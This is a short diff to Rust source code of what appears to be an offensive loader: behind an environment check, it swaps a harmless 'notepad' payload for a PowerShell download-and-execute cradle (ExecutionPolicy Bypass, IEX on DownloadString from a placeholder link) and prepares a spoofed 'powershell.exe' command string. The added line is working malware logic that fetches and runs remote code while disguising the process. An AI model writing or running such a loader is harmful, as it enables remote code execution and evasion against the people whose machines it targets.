@@ -29,7 +29,7 @@ fn main() {
     if power::run_all_checks() {
         println!("Work!");
     }
-    let malicious_command = r#"powershell.exe -ExecutionPolicy Bypass -Command "notepad""#;
+    let malicious_command = r#"powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('REPLACE_ME_WITH_RAW_LINK')""#;
     let malicious_command_wide = to_wide_chars(&malicious_command);
 
     let spoofed_command_str = "powershell.exe";
